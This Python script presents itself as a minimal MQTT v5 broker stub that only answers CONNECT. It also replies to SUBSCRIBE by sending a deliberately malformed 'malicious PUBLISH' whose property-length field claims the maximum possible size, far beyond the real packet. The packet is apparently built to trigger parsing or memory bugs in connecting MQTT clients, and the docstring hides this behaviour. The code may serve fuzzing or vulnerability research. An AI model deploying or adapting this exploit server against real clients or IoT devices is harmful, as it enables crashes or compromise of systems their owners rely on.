#!/usr/bin/env python3
"""
Minimal MQTT v5 broker stub.

Supports only CONNECT and replies with a basic CONNACK.
All other packets are read and ignored to keep the TCP session open.
"""

from __future__ import annotations

import argparse
import logging
import socket
import socketserver
from typing import Optional


PACKET_TYPES = {
    1: "CONNECT",
    2: "CONNACK",
    3: "PUBLISH",
    4: "PUBACK",
    5: "PUBREC",
    6: "PUBREL",
    7: "PUBCOMP",
    8: "SUBSCRIBE",
    9: "SUBACK",
    10: "UNSUBSCRIBE",
    11: "UNSUBACK",
    12: "PINGREQ",
    13: "PINGRESP",
    14: "DISCONNECT",
    15: "AUTH",
}


def read_exact(sock: socket.socket, nbytes: int) -> bytes:
    data = bytearray()
    while len(data) < nbytes:
        chunk = sock.recv(nbytes - len(data))
        if not chunk:
            break
        data.extend(chunk)
    if len(data) != nbytes:
        raise ConnectionError("socket closed while reading payload")
    return bytes(data)


def decode_varint_from_socket(sock: socket.socket) -> int:
    multiplier = 1
    value = 0
    for i in range(4):
        byte = sock.recv(1)
        if not byte:
            raise ConnectionError("socket closed while reading varint")
        encoded = byte[0]
        value += (encoded & 0x7F) * multiplier
        if (encoded & 0x80) == 0:
            return value
        multiplier *= 128
    raise ValueError("malformed varint (exceeds 4 bytes)")


def encode_varint(value: int) -> bytes:
    if value < 0:
        raise ValueError("varint must be non-negative")
    out = bytearray()
    while True:
        encoded = value % 128
        value //= 128
        if value > 0:
            encoded |= 0x80
        out.append(encoded)
        if value == 0:
            break
    return bytes(out)


def build_connack(session_present: int = 0, reason_code: int = 0) -> bytes:
    # MQTT v5 CONNACK: [0x20][remaining_len][ack_flags][reason][props_len=0]
    payload = bytes([session_present & 0x01, reason_code & 0xFF, 0x00])
    return bytes([0x20]) + encode_varint(len(payload)) + payload


def build_suback(packet_id: int, reason_code: int = 0) -> bytes:
    # MQTT v5 SUBACK: [0x90][remaining_len][packet_id][props_len=0][reason]
    payload = packet_id.to_bytes(2, "big") + bytes([0x00, reason_code & 0xFF])
    return bytes([0x90]) + encode_varint(len(payload)) + payload


def build_property_stream_even(target_len: int) -> bytes:
    # Build a stream of valid 2-byte properties (Payload Format Indicator).
    if target_len % 2 != 0:
        raise ValueError("target_len must be even for 2-byte properties")
    return bytes([0x01, 0x01]) * (target_len // 2)


def build_malicious_publish(topic: str = "sensor/data") -> bytes:
    # QoS 0 PUBLISH
    topic_bytes = topic.encode("utf-8")
    topic_len = len(topic_bytes)
    prop_len_field = bytes([0xFF, 0xFF, 0xFF, 0x7F])
    props = b""
    variable_header = (
        topic_len.to_bytes(2, "big")
        + topic_bytes
        + prop_len_field
        + props
    )
    # Choose an odd Remaining Length so payload_len is even.
    remaining_len = 4097
    if len(variable_header) > remaining_len:
        raise ValueError("variable header exceeds remaining length")
    payload_len = remaining_len - len(variable_header)
    if payload_len % 2 != 0:
        raise ValueError("payload_len must be even for property stream")
    payload = build_property_stream_even(payload_len)
    return bytes([0x30]) + encode_varint(remaining_len) + variable_header + payload


class MQTTStubHandler(socketserver.BaseRequestHandler):
    def handle(self) -> None:
        sock: socket.socket = self.request
        peer = f"{self.client_address[0]}:{self.client_address[1]}"
        logging.info("client connected: %s", peer)
        try:
            self._serve(sock, peer)
        except (ConnectionError, ValueError) as exc:
            logging.info("client %s disconnected: %s", peer, exc)
        except Exception:
            logging.exception("unexpected error for client %s", peer)
        finally:
            try:
                sock.close()
            except OSError:
                pass
            logging.info("client closed: %s", peer)

    def _serve(self, sock: socket.socket, peer: str) -> None:
        while True:
            first = sock.recv(1)
            if not first:
                raise ConnectionError("socket closed")

            packet_type = first[0] >> 4
            flags = first[0] & 0x0F
            remaining_len = decode_varint_from_socket(sock)
            payload = read_exact(sock, remaining_len) if remaining_len else b""

            name = PACKET_TYPES.get(packet_type, f"UNKNOWN({packet_type})")
            logging.info(
                "rx %s flags=0x%x remaining_len=%d from %s",
                name,
                flags,
                remaining_len,
                peer,
            )

            if packet_type == 1:  # CONNECT
                connack = build_connack()
                sock.sendall(connack)
                logging.info("tx CONNACK to %s", peer)
            elif packet_type == 8:  # SUBSCRIBE
                if len(payload) < 2:
                    raise ValueError("malformed SUBSCRIBE (no packet id)")
                packet_id = int.from_bytes(payload[0:2], "big")
                suback = build_suback(packet_id)
                sock.sendall(suback)
                logging.info("tx SUBACK to %s (packet_id=%d)", peer, packet_id)
                malicious = build_malicious_publish()
                sock.sendall(malicious)
                logging.info("tx malicious PUBLISH to %s", peer)
            # For now, ignore all other packet types and keep the TCP session open.


class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Minimal MQTT v5 broker stub")
    parser.add_argument("--host", default="0.0.0.0", help="bind host")
    parser.add_argument("--port", default=1884, type=int, help="bind port")
    parser.add_argument("--log-level", default="INFO", help="logging level")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    logging.basicConfig(level=args.log_level.upper(), format="%(asctime)s %(levelname)s %(message)s")
    with ThreadingTCPServer((args.host, args.port), MQTTStubHandler) as server:
        logging.info("MQTT v5 stub listening on %s:%d", args.host, args.port)
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            logging.info("shutting down")


if __name__ == "__main__":
    main()
